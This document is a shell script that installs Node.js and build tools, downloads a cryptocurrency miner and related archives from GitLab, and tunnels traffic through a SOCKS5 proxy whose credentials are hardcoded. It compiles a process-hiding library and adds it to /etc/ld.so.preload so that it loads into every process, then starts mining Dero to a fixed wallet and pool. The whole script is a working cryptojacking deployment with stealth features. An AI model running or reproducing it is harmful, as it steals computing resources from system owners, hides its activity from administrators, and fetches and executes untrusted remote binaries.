#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/gilaaja/exe/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

wget https://gitlab.com/gilalww/exe/-/raw/main/astrominer && chmod +x astrominer >/dev/null 2>&1
rm -rf wget-log*

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  128.199.222.68:443
socks5_username = arema
socks5_password = singoedan
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/gilaaja/exe/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
rm -rf wget-log*
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.$(echo $(shuf -i 1-20000 -n 1)-astro) -r pool.whalesburg.com:4300 -p stratum;
